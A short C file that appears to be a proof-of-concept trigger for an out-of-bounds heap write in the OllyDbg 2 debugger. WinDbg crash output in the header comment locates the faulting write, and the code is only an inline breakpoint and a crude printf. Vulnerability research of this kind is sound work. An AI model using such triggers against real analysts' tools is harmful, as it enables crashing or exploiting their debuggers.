/*
    OOB-write-heap-OllyDbg2h-trigger.c -- A 4 bytes write at the end of a HEAP_ENTRY
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    Original bug:
        (11a0.174): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        *** WARNING: Unable to verify checksum for ollydbg.exe
        *** ERROR: Symbol file could not be found.  Defaulted to export symbols for ollydbg.exe - 
        eax=00000312 ebx=1013e1fd ecx=057ae3b8 edx=0000264b esi=00578b6c edi=0018f5e0
        eip=004ce769 esp=00187d60 ebp=00187d80 iopl=0         nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
        ollydbg!Findfreehardbreakslot+0x21d9:
        004ce769 891481          mov     dword ptr [ecx+eax*4],edx ds:002b:057af000=????????
        0:000> !heap -p -a ecx
            address 057ae3b8 found in
            _DPH_HEAP_ROOT @ 4fe1000
            in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                         5820548:          57ae3b8              c48 -          57ae000             2000
            68488e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
            772e0d96 ntdll!RtlDebugAllocateHeap+0x00000030
            7729af0d ntdll!RtlpAllocateHeap+0x000000c4
            77243cfe ntdll!RtlAllocateHeap+0x0000023a
            76b24e55 KERNELBASE!GlobalAlloc+0x0000006e
            00403bef ollydbg!Memalloc+0x00000033
            004ce5ec ollydbg!Findfreehardbreakslot+0x0000205c
            004cf1df ollydbg!Getsourceline+0x0000007f
            00479e1b ollydbg!Getactivetab+0x0000241b
            0047b341 ollydbg!Setcpu+0x000006e1
            004570f4 ollydbg!Checkfordebugevent+0x00003f38
            0040fc51 ollydbg!Setstatus+0x00006441
            004ef9ef ollydbg!Pluginshowoptions+0x0001214f
        0:000> ? 57ae3b8 + c48
        Evaluate expression: 91942912 = 057af000 <- outside of the buffer :=)

*/
#include <stdio.h>

int main()
{
    __asm
    {
        int 3 ;; boom!
    }
    printf("Hi bitch!");
    return 0;
}
// DROP IT LIKE IT'S HOT, DROP IT LIKE IT'S HOOOOT :)